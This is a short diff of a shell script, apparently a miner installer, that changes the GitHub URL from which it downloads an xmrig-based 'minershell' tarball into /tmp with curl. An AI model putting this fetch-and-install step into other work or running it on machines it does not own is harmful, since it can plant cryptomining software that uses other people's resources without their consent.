@@ -45,8 +45,8 @@ echo "[*] Removing $HOME/minershell-main directory"
 rm -rf $HOME/minershell-main
 
 echo "[*] Downloading minershell-main advanced version of xmrig to /tmp/minershell-main.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/mine/main/minershell-main.tar.gz" -o /tmp/minershell-main.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx1/mine/main/minershell-main.tar.gz file to /tmp/minershell-main.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/xm/main/minershell-main.tar.gz" -o /tmp/minershell-main.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx1/xm/main/minershell-main.tar.gz file to /tmp/minershell-main.tar.gz"
   exit 1
 fi
 
